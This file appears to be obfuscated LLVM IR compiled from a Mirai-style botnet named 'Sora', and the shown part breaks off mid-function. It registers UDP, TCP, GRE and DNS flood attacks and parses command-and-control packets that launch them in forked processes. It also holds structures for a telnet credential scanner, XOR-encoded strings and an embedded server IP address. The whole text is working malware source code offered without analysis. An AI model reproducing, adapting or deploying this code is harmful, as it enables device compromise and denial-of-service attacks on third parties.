; ModuleID = 'host/ir_sub/Sora.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.scanner_connection = type { %struct.scanner_auth*, i32, i32, i32, i32, i16, i32, [256 x i8], i8 }
%struct.scanner_auth = type { i8*, i8*, i16, i16, i8, i8 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.grehdr = type { i16, i16 }
%struct.udphdr = type { i16, i16, i16, i16 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.ethhdr = type { [6 x i8], [6 x i8], i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.attack_stomp_data = type { i32, i32, i32, i16, i16 }
%struct.dnshdr = type { i16, i16, i16, i16, i16, i16 }
%struct.fd_set.26 = type { [16 x i64] }
%struct.timeval.27 = type { i64, i64 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [15 x i32] zeroinitializer, align 16
@LOCAL_ADDR = common global i32 0, align 4
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@scanner_pid = common global i32 0, align 4
@fake_time = global i32 0, align 4
@conn_table = common global %struct.scanner_connection* null, align 8
@rsck = common global i32 0, align 4
@scanner_rawpkt = global [40 x i8] zeroinitializer, align 16
@.str = private unnamed_addr constant [8 x i8] c"0125!8 \00", align 1
@.str.1 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.2 = private unnamed_addr constant [7 x i8] c"58 '8%\00", align 1
@.str.3 = private unnamed_addr constant [9 x i8] c"\1B,<8#\07\13l\00", align 1
@.str.4 = private unnamed_addr constant [9 x i8] c" 8\1E#$6;b\00", align 1
@.str.5 = private unnamed_addr constant [9 x i8] c"\07f2\13%\1A\12'\00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"&;; \00", align 1
@.str.7 = private unnamed_addr constant [7 x i8] c",7gaae\00", align 1
@.str.8 = private unnamed_addr constant [6 x i8] c"\22=.,\22\00", align 1
@.str.9 = private unnamed_addr constant [7 x i8] c"?8\22efg\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"509=:\00", align 1
@.str.11 = private unnamed_addr constant [9 x i8] c".-50efg`\00", align 1
@.str.12 = private unnamed_addr constant [6 x i8] c".8,,z\00", align 1
@.str.13 = private unnamed_addr constant [13 x i8] c"c!>\19?;d\22=.,\22\00", align 1
@.str.14 = private unnamed_addr constant [13 x i8] c"c!>\19?;d509=:\00", align 1
@.str.15 = private unnamed_addr constant [7 x i8] c"<=gael\00", align 1
@.str.16 = private unnamed_addr constant [8 x i8] c"75 edfm\00", align 1
@.str.17 = private unnamed_addr constant [10 x i8] c"5::=1fdef\00", align 1
@.str.18 = private unnamed_addr constant [9 x i8] c"7<5:3191\00", align 1
@.str.19 = private unnamed_addr constant [6 x i8] c"3!1' \00", align 1
@.str.20 = private unnamed_addr constant [7 x i8] c"efg`a.\00", align 1
@.str.21 = private unnamed_addr constant [7 x i8] c"efg`ab\00", align 1
@.str.22 = private unnamed_addr constant [5 x i8] c"!'1&\00", align 1
@.str.23 = private unnamed_addr constant [5 x i8] c"$5''\00", align 1
@.str.24 = private unnamed_addr constant [9 x i8] c"$5''#;&0\00", align 1
@.str.25 = private unnamed_addr constant [10 x i8] c"509=:efg`\00", align 1
@.str.26 = private unnamed_addr constant [8 x i8] c"'!$$;& \00", align 1
@.str.27 = private unnamed_addr constant [7 x i8] c"93gadd\00", align 1
@.str.28 = private unnamed_addr constant [7 x i8] c"91&8=:\00", align 1
@.str.29 = private unnamed_addr constant [7 x i8] c"0519;:\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"!6: \00", align 1
@.str.31 = private unnamed_addr constant [4 x i8] c"509\00", align 1
@.str.32 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.33 = private unnamed_addr constant [14 x i8] c"159.65.82.169\00", align 1
@consume_iacs.tmp1 = private unnamed_addr constant [3 x i8] c"\FF\FB\1F", align 1
@consume_iacs.tmp2 = private unnamed_addr constant [9 x i8] c"\FF\FA\1F\00P\00\18\FF\F0", align 1
@auth_table_max_weight = global i16 0, align 2
@auth_table_len = global i32 0, align 4
@auth_table = global %struct.scanner_auth* null, align 8
@table = common global [31 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 -555811921, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  call void @add_attack(i8 zeroext 0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpgeneric)
  call void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpvse)
  call void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpdns)
  call void @add_attack(i8 zeroext 8, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpplain)
  call void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpsyn)
  call void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpack)
  call void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpstomp)
  call void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpxmas)
  call void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greip)
  call void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greeth)
  call void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_std)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 1, i64 16) #6
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = sub i32 0, %17
  %19 = sub i32 0, 1
  %20 = add i32 %18, %19
  %21 = sub i32 0, %20
  %22 = add nsw i32 %17, 1
  %23 = sext i32 %21 to i64
  %24 = mul i64 %23, 8
  %25 = call i8* @realloc(i8* %15, i64 %24) #6
  %26 = bitcast i8* %25 to %struct.attack_method**
  store %struct.attack_method** %26, %struct.attack_method*** @methods, align 8
  %27 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %28 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %29 = load i8, i8* @methods_len, align 1
  %30 = sub i8 %29, -111
  %31 = add i8 %30, 1
  %32 = add i8 %31, -111
  %33 = add i8 %29, 1
  store i8 %32, i8* @methods_len, align 1
  %34 = zext i8 %29 to i64
  %35 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %28, i64 %34
  store %struct.attack_method* %27, %struct.attack_method** %35, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  br label %2

; <label>:2:                                      ; preds = %21, %0
  %3 = load i32, i32* %1, align 4
  %4 = icmp slt i32 %3, 15
  br i1 %4, label %5, label %27

; <label>:5:                                      ; preds = %2
  %6 = load i32, i32* %1, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %7
  %9 = load i32, i32* %8, align 4
  %10 = icmp ne i32 %9, 0
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %5
  %12 = load i32, i32* %1, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %13
  %15 = load i32, i32* %14, align 4
  %16 = call i32 @kill(i32 %15, i32 9) #6
  br label %17

; <label>:17:                                     ; preds = %11, %5
  %18 = load i32, i32* %1, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %19
  store i32 0, i32* %20, align 4
  br label %21

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %1, align 4
  %23 = add i32 %22, -524403634
  %24 = add i32 %23, 1
  %25 = sub i32 %24, -524403634
  %26 = add nsw i32 %22, 1
  store i32 %25, i32* %1, align 4
  br label %2

; <label>:27:                                     ; preds = %2
  call void (...) bitcast (void ()* @scanner_init to void (...)*)()
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  %15 = icmp ult i64 %14, 4
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %2
  br label %250

; <label>:17:                                     ; preds = %2
  %18 = load i8*, i8** %3, align 8
  %19 = bitcast i8* %18 to i32*
  %20 = load i32, i32* %19, align 4
  %21 = call i32 @ntohl(i32 %20) #7
  store i32 %21, i32* %6, align 4
  %22 = load i8*, i8** %3, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 4
  store i8* %23, i8** %3, align 8
  %24 = load i32, i32* %4, align 4
  %25 = sext i32 %24 to i64
  %26 = sub i64 0, 4
  %27 = add i64 %25, %26
  %28 = sub i64 %25, 4
  %29 = trunc i64 %27 to i32
  store i32 %29, i32* %4, align 4
  %30 = load i32, i32* %4, align 4
  %31 = icmp eq i32 %30, 0
  br i1 %31, label %32, label %33

; <label>:32:                                     ; preds = %17
  br label %250

; <label>:33:                                     ; preds = %17
  %34 = load i8*, i8** %3, align 8
  %35 = getelementptr inbounds i8, i8* %34, i32 1
  store i8* %35, i8** %3, align 8
  %36 = load i8, i8* %34, align 1
  store i8 %36, i8* %7, align 1
  %37 = load i32, i32* %4, align 4
  %38 = sext i32 %37 to i64
  %39 = sub i64 %38, 1437770715721227126
  %40 = sub i64 %39, 1
  %41 = add i64 %40, 1437770715721227126
  %42 = sub i64 %38, 1
  %43 = trunc i64 %41 to i32
  store i32 %43, i32* %4, align 4
  %44 = load i32, i32* %4, align 4
  %45 = icmp eq i32 %44, 0
  br i1 %45, label %46, label %47

; <label>:46:                                     ; preds = %33
  br label %250

; <label>:47:                                     ; preds = %33
  %48 = load i8*, i8** %3, align 8
  %49 = getelementptr inbounds i8, i8* %48, i32 1
  store i8* %49, i8** %3, align 8
  %50 = load i8, i8* %48, align 1
  store i8 %50, i8* %8, align 1
  %51 = load i32, i32* %4, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 %52, 3577951954478428727
  %54 = sub i64 %53, 1
  %55 = add i64 %54, 3577951954478428727
  %56 = sub i64 %52, 1
  %57 = trunc i64 %55 to i32
  store i32 %57, i32* %4, align 4
  %58 = load i8, i8* %8, align 1
  %59 = zext i8 %58 to i32
  %60 = icmp eq i32 %59, 0
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %47
  br label %250

; <label>:62:                                     ; preds = %47
  %63 = load i32, i32* %4, align 4
  %64 = sext i32 %63 to i64
  %65 = load i8, i8* %8, align 1
  %66 = zext i8 %65 to i64
  %67 = mul i64 5, %66
  %68 = icmp ult i64 %64, %67
  br i1 %68, label %69, label %70

; <label>:69:                                     ; preds = %62
  br label %250

; <label>:70:                                     ; preds = %62
  %71 = load i8, i8* %8, align 1
  %72 = zext i8 %71 to i64
  %73 = call noalias i8* @calloc(i64 %72, i64 24) #6
  %74 = bitcast i8* %73 to %struct.attack_target*
  store %struct.attack_target* %74, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  br label %75

; <label>:75:                                     ; preds = %125, %70
  %76 = load i32, i32* %5, align 4
  %77 = load i8, i8* %8, align 1
  %78 = zext i8 %77 to i32
  %79 = icmp slt i32 %76, %78
  br i1 %79, label %80, label %131

; <label>:80:                                     ; preds = %75
  %81 = load i8*, i8** %3, align 8
  %82 = bitcast i8* %81 to i32*
  %83 = load i32, i32* %82, align 4
  %84 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %85 = load i32, i32* %5, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 1
  store i32 %83, i32* %88, align 4
  %89 = load i8*, i8** %3, align 8
  %90 = getelementptr inbounds i8, i8* %89, i64 4
  store i8* %90, i8** %3, align 8
  %91 = load i8*, i8** %3, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 1
  store i8* %92, i8** %3, align 8
  %93 = load i8, i8* %91, align 1
  %94 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %95 = load i32, i32* %5, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %94, i64 %96
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %97, i32 0, i32 2
  store i8 %93, i8* %98, align 4
  %99 = load i32, i32* %4, align 4
  %100 = sext i32 %99 to i64
  %101 = sub i64 %100, -3512778724403906339
  %102 = sub i64 %101, 5
  %103 = add i64 %102, -3512778724403906339
  %104 = sub i64 %100, 5
  %105 = trunc i64 %103 to i32
  store i32 %105, i32* %4, align 4
  %106 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %107 = load i32, i32* %5, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %106, i64 %108
  %110 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %109, i32 0, i32 0
  %111 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %110, i32 0, i32 0
  store i16 2, i16* %111, align 4
  %112 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %113 = load i32, i32* %5, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %112, i64 %114
  %116 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %115, i32 0, i32 1
  %117 = load i32, i32* %116, align 4
  %118 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %119 = load i32, i32* %5, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %118, i64 %120
  %122 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %121, i32 0, i32 0
  %123 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %122, i32 0, i32 2
  %124 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %123, i32 0, i32 0
  store i32 %117, i32* %124, align 4
  br label %125

; <label>:125:                                    ; preds = %80
  %126 = load i32, i32* %5, align 4
  %127 = add i32 %126, 1406601768
  %128 = add i32 %127, 1
  %129 = sub i32 %128, 1406601768
  %130 = add nsw i32 %126, 1
  store i32 %129, i32* %5, align 4
  br label %75

; <label>:131:                                    ; preds = %75
  %132 = load i32, i32* %4, align 4
  %133 = sext i32 %132 to i64
  %134 = icmp ult i64 %133, 1
  br i1 %134, label %135, label %136

; <label>:135:                                    ; preds = %131
  br label %250

; <label>:136:                                    ; preds = %131
  %137 = load i8*, i8** %3, align 8
  %138 = getelementptr inbounds i8, i8* %137, i32 1
  store i8* %138, i8** %3, align 8
  %139 = load i8, i8* %137, align 1
  store i8 %139, i8* %9, align 1
  %140 = load i32, i32* %4, align 4
  %141 = sext i32 %140 to i64
  %142 = sub i64 %141, -1957318210051127921
  %143 = sub i64 %142, 1
  %144 = add i64 %143, -1957318210051127921
  %145 = sub i64 %141, 1
  %146 = trunc i64 %144 to i32
  store i32 %146, i32* %4, align 4
  %147 = load i8, i8* %9, align 1
  %148 = zext i8 %147 to i32
  %149 = icmp sgt i32 %148, 0
  br i1 %149, label %150, label %242

; <label>:150:                                    ; preds = %136
  %151 = load i8, i8* %9, align 1
  %152 = zext i8 %151 to i64
  %153 = call noalias i8* @calloc(i64 %152, i64 16) #6
  %154 = bitcast i8* %153 to %struct.attack_option*
  store %struct.attack_option* %154, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  br label %155

; <label>:155:                                    ; preds = %235, %150
  %156 = load i32, i32* %5, align 4
  %157 = load i8, i8* %9, align 1
  %158 = zext i8 %157 to i32
  %159 = icmp slt i32 %156, %158
  br i1 %159, label %160, label %241

; <label>:160:                                    ; preds = %155
  %161 = load i32, i32* %4, align 4
  %162 = sext i32 %161 to i64
  %163 = icmp ult i64 %162, 1
  br i1 %163, label %164, label %165

; <label>:164:                                    ; preds = %160
  br label %250

; <label>:165:                                    ; preds = %160
  %166 = load i8*, i8** %3, align 8
  %167 = getelementptr inbounds i8, i8* %166, i32 1
  store i8* %167, i8** %3, align 8
  %168 = load i8, i8* %166, align 1
  %169 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %170 = load i32, i32* %5, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %169, i64 %171
  %173 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %172, i32 0, i32 1
  store i8 %168, i8* %173, align 8
  %174 = load i32, i32* %4, align 4
  %175 = sext i32 %174 to i64
  %176 = sub i64 0, 1
  %177 = add i64 %175, %176
  %178 = sub i64 %175, 1
  %179 = trunc i64 %177 to i32
  store i32 %179, i32* %4, align 4
  %180 = load i32, i32* %4, align 4
  %181 = sext i32 %180 to i64
  %182 = icmp ult i64 %181, 1
  br i1 %182, label %183, label %184

; <label>:183:                                    ; preds = %165
  br label %250

; <label>:184:                                    ; preds = %165
  %185 = load i8*, i8** %3, align 8
  %186 = getelementptr inbounds i8, i8* %185, i32 1
  store i8* %186, i8** %3, align 8
  %187 = load i8, i8* %185, align 1
  store i8 %187, i8* %12, align 1
  %188 = load i32, i32* %4, align 4
  %189 = sext i32 %188 to i64
  %190 = sub i64 %189, 8479049271095260841
  %191 = sub i64 %190, 1
  %192 = add i64 %191, 8479049271095260841
  %193 = sub i64 %189, 1
  %194 = trunc i64 %192 to i32
  store i32 %194, i32* %4, align 4
  %195 = load i32, i32* %4, align 4
  %196 = load i8, i8* %12, align 1
  %197 = zext i8 %196 to i32
  %198 = icmp slt i32 %195, %197
  br i1 %198, label %199, label %200

; <label>:199:                                    ; preds = %184
  br label %250

; <label>:200:                                    ; preds = %184
  %201 = load i8, i8* %12, align 1
  %202 = zext i8 %201 to i32
  %203 = sub i32 %202, -805885316
  %204 = add i32 %203, 1
  %205 = add i32 %204, -805885316
  %206 = add nsw i32 %202, 1
  %207 = sext i32 %205 to i64
  %208 = call noalias i8* @calloc(i64 %207, i64 1) #6
  %209 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %210 = load i32, i32* %5, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %209, i64 %211
  %213 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %212, i32 0, i32 0
  store i8* %208, i8** %213, align 8
  %214 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %215 = load i32, i32* %5, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %214, i64 %216
  %218 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %217, i32 0, i32 0
  %219 = load i8*, i8** %218, align 8
  %220 = load i8*, i8** %3, align 8
  %221 = load i8, i8* %12, align 1
  %222 = zext i8 %221 to i32
  call void @util_memcpy(i8* %219, i8* %220, i32 %222)
  %223 = load i8, i8* %12, align 1
  %224 = zext i8 %223 to i32
  %225 = load i8*, i8** %3, align 8
  %226 = sext i32 %224 to i64
  %227 = getelementptr inbounds i8, i8* %225, i64 %226
  store i8* %227, i8** %3, align 8
  %228 = load i8, i8* %12, align 1
  %229 = zext i8 %228 to i32
  %230 = load i32, i32* %4, align 4
  %231 = sub i32 %230, 775367758
  %232 = sub i32 %231, %229
  %233 = add i32 %232, 775367758
  %234 = sub nsw i32 %230, %229
  store i32 %233, i32* %4, align 4
  br label %235

; <label>:235:                                    ; preds = %200
  %236 = load i32, i32* %5, align 4
  %237 = add i32 %236, -1626079175
  %238 = add i32 %237, 1
  %239 = sub i32 %238, -1626079175
  %240 = add nsw i32 %236, 1
  store i32 %239, i32* %5, align 4
  br label %155

; <label>:241:                                    ; preds = %155
  br label %242

; <label>:242:                                    ; preds = %241, %136
  %243 = call i32* @__errno_location() #7
  store i32 0, i32* %243, align 4
  %244 = load i32, i32* %6, align 4
  %245 = load i8, i8* %7, align 1
  %246 = load i8, i8* %8, align 1
  %247 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %248 = load i8, i8* %9, align 1
  %249 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %244, i8 zeroext %245, i8 zeroext %246, %struct.attack_target* %247, i8 zeroext %248, %struct.attack_option* %249)
  br label %250

; <label>:250:                                    ; preds = %242, %199, %183, %164, %135, %69, %61, %46, %32, %16
  %251 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %252 = icmp ne %struct.attack_target* %251, null
  br i1 %252, label %253, label %256

; <label>:253:                                    ; preds = %250
  %254 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %255 = bitcast %struct.attack_target* %254 to i8*
  call void @free(i8* %255) #6
  br label %256

; <label>:256:                                    ; preds = %253, %250
  %257 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %258 = icmp ne %struct.attack_option* %257, null
  br i1 %258, label %259, label %263

; <label>:259:                                    ; preds = %256
  %260 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %261 = load i8, i8* %9, align 1
  %262 = zext i8 %261 to i32
  call void @free_opts(%struct.attack_option* %260, i32 %262)
  br label %263

; <label>:263:                                    ; preds = %259, %256
  ret void
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

declare void @util_memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
  store %struct.attack_option* %5, %struct.attack_option** %12, align 8
  %16 = call i32 @fork() #6
  store i32 %16, i32* %13, align 4
  %17 = load i32, i32* %13, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %22, label %19

; <label>:19:                                     ; preds = %6
  %20 = load i32, i32* %13, align 4
  %21 = icmp sgt i32 %20, 0
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %19, %6
  ret void

; <label>:23:                                     ; preds = %19
  %24 = call i32 @fork() #6
  store i32 %24, i32* %14, align 4
  %25 = load i32, i32* %14, align 4
  %26 = icmp eq i32 %25, -1
  br i1 %26, label %27, label %28

; <label>:27:                                     ; preds = %23
  call void @exit(i32 0) #8
  unreachable

; <label>:28:                                     ; preds = %23
  %29 = load i32, i32* %14, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %36

; <label>:31:                                     ; preds = %28
  %32 = load i32, i32* %7, align 4
  %33 = call i32 @sleep(i32 %32)
  %34 = call i32 @getppid() #6
  %35 = call i32 @kill(i32 %34, i32 9) #6
  call void @exit(i32 0) #8
  unreachable

; <label>:36:                                     ; preds = %28
  store i32 0, i32* %15, align 4
  br label %37

; <label>:37:                                     ; preds = %67, %36
  %38 = load i32, i32* %15, align 4
  %39 = load i8, i8* @methods_len, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp slt i32 %38, %40
  br i1 %41, label %42, label %72

; <label>:42:                                     ; preds = %37
  %43 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %44 = load i32, i32* %15, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %43, i64 %45
  %47 = load %struct.attack_method*, %struct.attack_method** %46, align 8
  %48 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %47, i32 0, i32 1
  %49 = load i8, i8* %48, align 8
  %50 = zext i8 %49 to i32
  %51 = load i8, i8* %8, align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %50, %52
  br i1 %53, label %54, label %66

; <label>:54:                                     ; preds = %42
  %55 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %56 = load i32, i32* %15, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %55, i64 %57
  %59 = load %struct.attack_method*, %struct.attack_method** %58, align 8
  %60 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %59, i32 0, i32 0
  %61 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %60, align 8
  %62 = load i8, i8* %9, align 1
  %63 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %64 = load i8, i8* %11, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %12, align 8
  call void %61(i8 zeroext %62, %struct.attack_target* %63, i8 zeroext %64, %struct.attack_option* %65)
  br label %72

; <label>:66:                                     ; preds = %42
  br label %67

; <label>:67:                                     ; preds = %66
  %68 = load i32, i32* %15, align 4
  %69 = sub i32 0, 1
  %70 = sub i32 %68, %69
  %71 = add nsw i32 %68, 1
  store i32 %70, i32* %15, align 4
  br label %37

; <label>:72:                                     ; preds = %54, %37
  call void @exit(i32 0) #8
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8*) #1

; Function Attrs: noinline nounwind uwtable
define internal void @free_opts(%struct.attack_option*, i32) #0 {
  %3 = alloca %struct.attack_option*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store %struct.attack_option* %0, %struct.attack_option** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %7 = icmp eq %struct.attack_option* %6, null
  br i1 %7, label %8, label %9

; <label>:8:                                      ; preds = %2
  br label %38

; <label>:9:                                      ; preds = %2
  store i32 0, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %30, %9
  %11 = load i32, i32* %5, align 4
  %12 = load i32, i32* %4, align 4
  %13 = icmp slt i32 %11, %12
  br i1 %13, label %14, label %35

; <label>:14:                                     ; preds = %10
  %15 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %15, i64 %17
  %19 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  %21 = icmp ne i8* %20, null
  br i1 %21, label %22, label %29

; <label>:22:                                     ; preds = %14
  %23 = load %struct.attack_option*, %struct.attack_option** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
